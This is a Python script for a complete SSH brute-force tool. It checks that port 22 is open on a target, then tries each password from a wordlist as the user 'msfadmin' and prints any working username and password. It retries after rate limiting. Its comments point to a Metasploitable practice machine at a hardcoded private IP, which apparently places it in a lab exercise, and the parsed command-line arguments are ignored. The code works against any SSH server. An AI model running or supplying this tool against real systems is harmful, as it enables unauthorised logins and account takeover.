import socket
import time
from colorama import init, Fore
import paramiko

# Initialize colorama
init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

class SSHBruteforcer:
    def __init__(self, target_host, passwords_file, port=22):
        self.target_host = target_host
        self.passwords_file = passwords_file
        self.port = port

    def scan_port(self):
        """
        Scan the specified port on the target host
        :return: None
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket type is IPv4 and TCP
            result = sock.connect_ex((self.target_host, self.port))
            if result == 0:
                print(f"Port {self.port} is open and Password of Metasploitable-linux-2.0.0 is below in" + Fore.GREEN + " GREEN " + Fore.RESET + "Line")
                if self.port == 22:
                    self.brute_ssh("msfadmin")  # Brute force with default username
            else:
                print(f"Port {self.port} is closed")
            sock.close()
        except socket.error:
            print("Error occurred while connecting to the host")

    def brute_ssh(self, username):
        """
        SSH brute force tool
        :param username: (str) username to use to connect
        :return: None
        """
        with open(self.passwords_file, "r") as password_file:
            for password_attempt in password_file:
                password = password_attempt.strip()
                if self._try_password(username, password):
                    break

    def _try_password(self, username, password):
        """
        Attempt to connect using the specified username and password
        :param username: (str) username to use to connect
        :param password: (str) password to use to connect
        :return: True if the connection is successful, False otherwise
        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=self.target_host, username=username, password=password, timeout=1)
        except socket.timeout:
            print(f"{RED}[!] Host: {self.target_host} is unreachable. {RESET}")
            return False
        except paramiko.AuthenticationException:
            print(f"[!] Invalid Credentials for {username}:{password}")
            return False
        except paramiko.SSHException:
            print(f"{BLUE} [*] Quota exceeded, retrying after 1 minute... {RESET}")
            time.sleep(60)
            return self._try_password(username, password)  # Recursive call to retry
        else:
            print(f"{GREEN} [+] Found Combo: {username}:{password} {RESET}")
            return True

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("-H", "--host", help="Hostname or IP Address of SSH Server to bruteforce. IP address of host Metasploit")
    parser.add_argument("-P", "--passfile", help="File that contains a password list in each line check passwords.txt file.")
    parser.add_argument("-p", "--port", type=int, default=22, help="Port number (default: 22)")
    args = parser.parse_args()

    # bruteforcer = SSHBruteforcer(args.host, args.passfile, args.port)
    bruteforcer = SSHBruteforcer("192.168.145.146", "passwords.txt", port=22)
    bruteforcer.scan_port()